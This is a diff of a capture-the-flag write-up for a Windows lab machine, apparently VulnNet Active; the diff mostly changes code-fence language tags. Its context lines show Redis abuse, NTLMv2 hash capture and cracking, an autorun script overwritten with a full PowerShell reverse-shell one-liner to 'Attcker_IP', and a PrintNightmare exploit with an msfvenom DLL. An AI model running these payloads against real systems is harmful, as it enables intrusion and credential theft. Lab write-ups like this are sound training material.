@@ -18,7 +18,7 @@ I used rustscan because I like its style and it instantly gives a response after
 rustscan -a $IP -- -A -sC -sV -oN nmap.txt
 ````````
 
-````````
+````````python
 ----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
@@ -193,7 +193,7 @@ As we saw on our scan result we found Redis key-value store is running on
 redis-cli -h $IP
 ````````
 
-````````
+````````python
 10.10.16.131:6379> INFO
 # Server
 redis_version:2.8.2402
@@ -292,7 +292,7 @@ We have successfully authenticated with Redis key-value store. Now let us do som
 10.10.16.131:6379> CONFIG GET *
 ````````
 
-````````
+````````python
   1) "dbfilename"
   2) "dump.rdb"
   3) "requirepass"
@@ -427,7 +427,7 @@ we see on line 104 " C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.24
 10.10.16.131:6379> EVAL "dofile('C:/Users/enterprise-security/Desktop/user.txt')" 0
 ````````
 
-````````
+````````python
 (error) ERR Error running script (call to f_eebcad8707d6acaa5a1f5511b5d88676a90438d6): @user_script:1: C:/Users/enterprise-security/Desktop/user.txt:1: malformed number near '3eb176aee96432d5b100bc93580b291e' 
 10.10.16.131:6379> 
 
@@ -440,7 +440,7 @@ So It is proved we have some kind of RCE. Let's try to Capture NTLM V2 HASH with
 responder -I tun0 
 ````````
 
-````````
+````````python
                                         __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
@@ -514,7 +514,7 @@ responder -I tun0
 
 ## We captured a hash!
 
-````````
+````````python
 [SMB] NTLMv2-SSP Client   : ::ffff:10.10.16.131
 [SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
 [SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:{REDACTED}
@@ -531,7 +531,7 @@ we can use the name-the-hash tool by own bee-san!.
 nth --file hash.txt
 ````````
 
-````````
+````````python
  _   _                           _____ _           _          _   _           _     
  | \ | |                         |_   _| |         | |        | | | |         | |    
  |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
@@ -556,7 +556,7 @@ NetNTLMv2, HC: 5600 JtR: netntlmv2
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
 ````````
 
-````````
+````````python
 hashcat (v6.2.5) starting
 
 You have enabled --force to bypass dangerous warnings and errors!
@@ -627,7 +627,7 @@ Stopped: Sat Mar 12 23:56:32 2022
 smbclient -L \\\\$IP\\ -U enterprise-security
 ````````
 
-````````
+````````python
 Enter WORKGROUP\enterprise-security's password: 
 
 	Sharename       Type      Comment
@@ -649,7 +649,7 @@ Let's check out the Enterprise-Share share.
 smbclient  \\\\$IP\\Enterprise-Share -U enterprise-security
 ````````
 
-````````
+````````python
 Enter WORKGROUP\enterprise-security's password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -669,7 +669,7 @@ We found that PurgeIrrelevantData_1826.ps1 is on autorun. We can overwrite the f
 
 ## PowerShell reverse shell payload.
 
-````````
+````````c
 $client = New-Object System.Net.Sockets.TCPClient('Attcker_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
 ````````
@@ -681,7 +681,7 @@ We add this payload in PurgeIrrelevantData_1826.ps1 and upload it on the SMB ser
 nc -nvlp 1234
 ````````
 
-````````
+````````python
 Ncat: Version 7.92 ( https://nmap.org/ncat )
 Ncat: Listening on :::1234
 Ncat: Listening on 0.0.0.0:1234
@@ -764,7 +764,7 @@ It is Microsoft Windows Server 2019. we know it is vulnerable to PrintNightMare 
 
 we create a dll payload with Metasploit. which is required to perform the exploit.
 
-````````
+````````c
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={Attcker_IP} LPORT={PORT} -f dll > msf.dll
 ````````
 
@@ -774,7 +774,7 @@ Now we will set up a meterpreter listener for facilitating the reverse connectio
 msfconsole
 ````````
 
-````````
+````````python
 msf6 > use exploit/multi/handler 
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
@@ -816,7 +816,7 @@ we set up a samba share with anonymous login. This is required for hosting the d
 smbserver.py share `pwd` -smb2support 
 ````````
 
-````````
+````````python
 Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
 
 [*] Config file parsed
@@ -833,7 +833,7 @@ Now we will run the exploit and gain access to this machine.
 python3 CVE-2021-1675.py VULNNET/enterprise-security:***************@{Target_IP}  '\\{Your_IP}\share\msf.dll'
 ````````
 
-````````
+````````python
 [*] Connecting to ncacn_np:10.10.242.198[\PIPE\spoolss]
 [+] Bind OK
 [+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\UNIDRV.DLL
@@ -847,7 +847,7 @@ python3 CVE-2021-1675.py VULNNET/enterprise-security:***************@{Target_IP}
 
 ### Successfully get a reverse shell connection
 
-````````
+````````python
 [*] Started reverse TCP handler on 10.8.59.75:6666 
 [*] Sending stage (200262 bytes) to 10.10.242.198
 [*] Meterpreter session 1 opened (10.8.59.75:6666 -> 10.10.242.198:49961 ) at 2022-03-13 00:34:33 +0530
@@ -860,7 +860,7 @@ meterpreter >
 
 ### Getting system.txt
 
-````````
+````````python
 meterpreter > pwd
 C:\Windows\system32
 meterpreter > cd C:Users\Administrator\Desktop
